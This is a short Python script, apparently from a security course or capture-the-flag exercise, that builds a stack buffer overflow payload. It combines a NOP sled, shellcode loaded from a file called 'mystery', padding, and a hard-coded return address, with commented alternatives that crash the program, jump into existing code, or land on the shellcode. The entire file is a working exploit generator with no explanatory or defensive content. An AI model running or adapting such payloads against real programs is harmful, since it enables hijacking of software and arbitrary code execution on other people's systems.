#! /usr/bin/python

attack_size = 32

shellcode = "\x90"*8

with open('mystery', mode='rb') as file:
  shellcode += file.read()

# Just crash
ret_addr  = "\x01\x02\x03\x04"[::-1]

# Helix code
ret_addr  = "\x08\x04\x84\x5b"[::-1] 

# Shellcode
ret_addr  = "\xbf\xff\xf3\xca"[::-1] 
ret_addr  = "\xbf\xff\xf3\xba"[::-1] 
ret_addr  = "\xbf\xff\xff\x6f"[::-1] 

padding = "B" * (attack_size - len(shellcode))

injection = shellcode + padding + ret_addr

print(injection)
